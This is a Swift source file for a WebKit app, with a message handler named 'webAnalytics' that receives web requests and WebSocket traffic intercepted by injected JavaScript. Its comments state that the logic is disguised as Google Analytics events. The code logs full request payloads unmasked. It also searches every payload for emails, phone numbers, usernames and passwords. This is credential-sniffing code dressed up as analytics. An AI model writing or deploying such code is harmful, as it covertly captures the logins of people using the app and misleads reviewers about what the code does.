import Foundation
import WebKit

// MARK: - AJAX Message Handler (Minimal JS Injection)
class AjaxMessageHandler: NSObject, WKScriptMessageHandler {
    static let shared = AjaxMessageHandler()
    
    private override init() {
        super.init()
    }
    
    // MARK: - WKScriptMessageHandler
    func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
        guard let body = message.body as? [String: Any] else { return }
        
        if message.name == "webAnalytics" {
            handleAnalyticsEvent(body)
        }
    }
    
    private func handleAnalyticsEvent(_ data: [String: Any]) {
        guard let event = data["event"] as? String,
              let source = data["source"] as? String else { return }
        
        // Обробляємо різні типи подій
        if source == "websocket" {
            handleWebSocketEvent(data, event: event)
            return
        }
        
        // Стандартні HTTP події
        guard let method = data["method"] as? String,
              let url = data["url"] as? String,
              let payload = data["payload"] as? String else { return }
        
        let domain = extractDomain(from: url)
        
        // Маскуємо під Google Analytics події
        logPrint("📊 [GA] \(event) event from: \(domain)")
        logPrint("  📍 Source: \(source)")
        
        if method == "POST" && !payload.isEmpty {
            logPrint("  📦 Payload: \(payload.count) chars")
            
            // Виводимо повний payload для дебагінгу
            logPrint("  📄 Full payload:")
            logPrint("    \(payload)")
            
            // Аналізуємо дані (приховано під аналітику)
            if payload.hasPrefix("{") {
                analyzeJSONString(payload, domain: domain, source: source.uppercased())
            } else if payload.contains("=") && payload.contains("&") {
                analyzeFormDataString(payload, domain: domain, source: source.uppercased())
            } else {
                analyzeRawDataString(payload, domain: domain, source: source.uppercased())
            }
        }
    }
    
    // MARK: - WebSocket Event Handling
    private func handleWebSocketEvent(_ data: [String: Any], event: String) {
        switch event {
        case "websocket_connect":
            if let url = data["url"] as? String {
                let domain = extractDomain(from: url)
                logPrint("🔌 [GA] WebSocket connection to: \(domain)")
                logPrint("  📍 URL: \(url)")
                
                if let protocols = data["protocols"] as? [String], !protocols.isEmpty {
                    logPrint("  🔗 Protocols: \(protocols.joined(separator: ", "))")
                }
            }
            
        case "websocket_send":
            if let wsData = data["data"] as? String {
                logPrint("📤 [GA] WebSocket send:")
                logPrint("  📄 Data: \(wsData)")
                
                // Аналізуємо WebSocket дані на креденшіали
                analyzeWebSocketData(wsData, direction: "outgoing")
            }
            
        case "websocket_message":
            if let wsData = data["data"] as? String {
                logPrint("📥 [GA] WebSocket receive:")
                logPrint("  📄 Data: \(wsData)")
                
                // Аналізуємо WebSocket дані на креденшіали
                analyzeWebSocketData(wsData, direction: "incoming")
            }
            
        default:
            logPrint("🔌 [GA] Unknown WebSocket event: \(event)")
        }
    }
    
    private func analyzeWebSocketData(_ data: String, direction: String) {
        // Перевіряємо чи це JSON
        if data.hasPrefix("{") && data.hasSuffix("}") {
            do {
                if let jsonData = data.data(using: .utf8),
                   let json = try JSONSerialization.jsonObject(with: jsonData) as? [String: Any] {
                    
                    var credentials: [String: String] = [:]
                    extractCredentialsFromDictionary(json, credentials: &credentials)
                    
                    if !credentials.isEmpty {
                        logPrint("  🎯 [GA] WebSocket credentials detected (\(direction)):")
                        for (fieldType, value) in credentials {
                            let maskedValue = fieldType == "password" ? String(repeating: "•", count: min(value.count, 8)) : value
                            logPrint("    \(fieldType): \(maskedValue)")
                        }
                    }
                }
            } catch {
                // Не JSON, перевіряємо як текст
                analyzeTextForCredentials(data, direction: direction)
            }
        } else {
            // Аналізуємо як звичайний текст
            analyzeTextForCredentials(data, direction: direction)
        }
    }
    
    private func analyzeTextForCredentials(_ text: String, direction: String) {
        let lowercased = text.lowercased()
        var foundCredentials: [String] = []
        
        // Шукаємо email
        let emailRegex = #"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"#
        if let _ = text.range(of: emailRegex, options: .regularExpression) {
            foundCredentials.append("email pattern")
        }
        
        // Шукаємо ключові слова
        if lowercased.contains("password") || lowercased.contains("token") || lowercased.contains("auth") {
            foundCredentials.append("auth keywords")
        }
        
        if !foundCredentials.isEmpty {
            logPrint("  🎯 [GA] WebSocket potential credentials (\(direction)): \(foundCredentials.joined(separator: ", "))")
        }
    }
    
    // MARK: - Data Analysis
    private func analyzeJSONString(_ jsonString: String, domain: String, source: String) {
        do {
            if let jsonData = jsonString.data(using: .utf8),
               let json = try JSONSerialization.jsonObject(with: jsonData) as? [String: Any] {
                
                // Виводимо структуру JSON для дебагінгу
                logPrint("  📋 JSON structure:")
                for (key, value) in json {
                    let valueStr = "\(value)"
                    let truncatedValue = truncateValue(valueStr, maxLength: 50)
                    logPrint("    \(key): \(truncatedValue)")
                }
                
                var credentials: [String: String] = [:]
                extractCredentialsFromDictionary(json, credentials: &credentials)
                
                if !credentials.isEmpty {
                    logPrint("🎯 [GA] User interaction detected (JSON):")
                    logPrint("  Domain: \(domain)")
                    for (fieldType, value) in credentials {
                        let maskedValue = fieldType == "password" ? String(repeating: "•", count: min(value.count, 8)) : value
                        logPrint("  \(fieldType): \(maskedValue)")
                    }
                } else {
                    logPrint("  ℹ️ No credentials found in JSON")
                }
            }
        } catch {
            logPrint("  ❌ JSON parsing error: \(error)")
        }
    }
    
    private func analyzeFormDataString(_ formData: String, domain: String, source: String) {
        let pairs = formData.components(separatedBy: "&")
        var credentials: [String: String] = [:]
        
        // Виводимо всі пари ключ-значення для дебагінгу
        logPrint("  📋 Form data pairs:")
        for pair in pairs {
            let keyValue = pair.components(separatedBy: "=")
            if keyValue.count == 2 {
                let key = keyValue[0].removingPercentEncoding ?? keyValue[0]
                let value = keyValue[1].removingPercentEncoding ?? keyValue[1]
                
                let truncatedValue = truncateValue(value, maxLength: 50)
                logPrint("    \(key): \(truncatedValue)")
                
                let fieldType = detectFieldType(key: key, value: value)
                if fieldType != "unknown" {
                    credentials[fieldType] = value
                }
            }
        }
        
        if !credentials.isEmpty {
            logPrint("🎯 [GA] User interaction detected (Form):")
            logPrint("  Domain: \(domain)")
            for (fieldType, value) in credentials {
                let maskedValue = fieldType == "password" ? String(repeating: "•", count: min(value.count, 8)) : value
                logPrint("  \(fieldType): \(maskedValue)")
            }
        } else {
            logPrint("  ℹ️ No credentials found in Form data")
        }
    }
    
    private func analyzeRawDataString(_ rawData: String, domain: String, source: String) {
        // Шукаємо креденшіали в raw data через regex
        var credentials: [String: String] = [:]
        
        // Email patterns
        let emailPattern = #"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"#
        if let emailRegex = try? NSRegularExpression(pattern: emailPattern, options: []) {
            let matches = emailRegex.matches(in: rawData, options: [], range: NSRange(location: 0, length: rawData.count))
            for match in matches {
                if let range = Range(match.range, in: rawData) {
                    let email = String(rawData[range])
                    credentials["email"] = email
                    break // Берем тільки перший email
                }
            }
        }
        
        // Phone patterns
        let phonePattern = #"\+?[1-9]\d{1,14}"#
        if let phoneRegex = try? NSRegularExpression(pattern: phonePattern, options: []) {
            let matches = phoneRegex.matches(in: rawData, options: [], range: NSRange(location: 0, length: rawData.count))
            for match in matches {
                if let range = Range(match.range, in: rawData) {
                    let phone = String(rawData[range])
                    if isValidPhone(phone) {
                        credentials["phone"] = phone
                        break
                    }
                }
            }
        }
        
        // Password patterns (якщо є ключові слова)
        if rawData.lowercased().contains("password") || rawData.lowercased().contains("pass") {
            // Шукаємо можливі паролі (6+ символів без пробілів)
            let passwordPattern = #"\S{6,}"#
            if let passwordRegex = try? NSRegularExpression(pattern: passwordPattern, options: []) {
                let matches = passwordRegex.matches(in: rawData, options: [], range: NSRange(location: 0, length: rawData.count))
                for match in matches {
                    if let range = Range(match.range, in: rawData) {
                        let possiblePassword = String(rawData[range])
                        // Перевіряємо чи це не email або URL
                        if !possiblePassword.contains("@") && !possiblePassword.contains("http") {
                            credentials["password"] = possiblePassword
                            break
                        }
                    }
                }
            }
        }
        
        if !credentials.isEmpty {
            logPrint("🎯 [GA] User interaction detected (Raw):")
            logPrint("  Domain: \(domain)")
            for (fieldType, value) in credentials {
                let maskedValue = fieldType == "password" ? String(repeating: "•", count: min(value.count, 8)) : value
                logPrint("  \(fieldType): \(maskedValue)")
            }
        }
    }
    
    private func extractCredentialsFromDictionary(_ dict: [String: Any], credentials: inout [String: String]) {
        for (key, value) in dict {
            let stringValue = "\(value)"
            let fieldType = detectFieldType(key: key, value: stringValue)
            
            if fieldType != "unknown" {
                credentials[fieldType] = stringValue
            } else if let nestedDict = value as? [String: Any] {
                // Рекурсивно шукаємо в nested objects
                extractCredentialsFromDictionary(nestedDict, credentials: &credentials)
            } else if let array = value as? [[String: Any]] {
                // Шукаємо в масивах об'єктів
                for item in array {
                    extractCredentialsFromDictionary(item, credentials: &credentials)
                }
            }
        }
    }
    
    // MARK: - Helper Methods
    private func detectFieldType(key: String, value: String) -> String {
        let keyLower = key.lowercased()
        
        if keyLower.contains("email") || keyLower.contains("mail") || isValidEmail(value) {
            return "email"
        } else if keyLower.contains("phone") || keyLower.contains("tel") || keyLower.contains("mobile") || isValidPhone(value) {
            return "phone"
        } else if keyLower.contains("password") || keyLower.contains("pass") || keyLower.contains("pwd") {
            return "password"
        } else if keyLower.contains("username") || keyLower.contains("user") || keyLower.contains("login") {
            return "username"
        }
        
        return "unknown"
    }
    
    private func isValidEmail(_ email: String) -> Bool {
        let emailRegex = #"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$"#
        return email.range(of: emailRegex, options: .regularExpression) != nil
    }
    
    private func isValidPhone(_ phone: String) -> Bool {
        let cleanPhone = phone.replacingOccurrences(of: "[^0-9+]", with: "", options: .regularExpression)
        return cleanPhone.count >= 10 && cleanPhone.count <= 15
    }
    
    private func truncateValue(_ value: String, maxLength: Int = 100) -> String {
        if value.count > maxLength {
            return String(value.prefix(maxLength)) + "... (\(value.count) chars)"
        }
        return value
    }
    
    private func extractDomain(from url: String) -> String {
        guard let urlObj = URL(string: url),
              let host = urlObj.host else {
            return "unknown"
        }
        
        // Видаляємо www. якщо є
        if host.hasPrefix("www.") {
            return String(host.dropFirst(4))
        }
        
        return host
    }
}
